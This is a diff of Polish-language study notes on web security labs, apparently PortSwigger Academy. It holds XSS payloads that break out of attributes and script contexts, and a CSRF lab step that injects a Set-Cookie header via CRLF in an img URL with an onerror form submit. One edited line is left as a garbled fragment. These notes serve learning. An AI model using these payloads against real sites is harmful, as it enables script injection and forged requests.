@@ -131,7 +131,11 @@ Jeśli jesteśmy wewnątrz skryptu:
 ```
 " autofocus onfocus=alert(document.domain) x="
 ```
-Jeśli jesteśmy wewnątrz jakiegoś elementu np <img src="[]"...>:
+Jeśli jesteśmy wewnątrz jakiegoś elementu np 
+
+
+
+src="[]"...>:
 ```
 "><script>alert(document.domain)</script>
 ```
@@ -240,7 +244,7 @@ i mamy:
 
 ## Lab:CSRF token is tied to a non-session cookie
 1. Jeśli mamy do zmiany dwa parametry warto użyć
-<img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
+`<img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">`, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
 ```
     <html>
         <body>
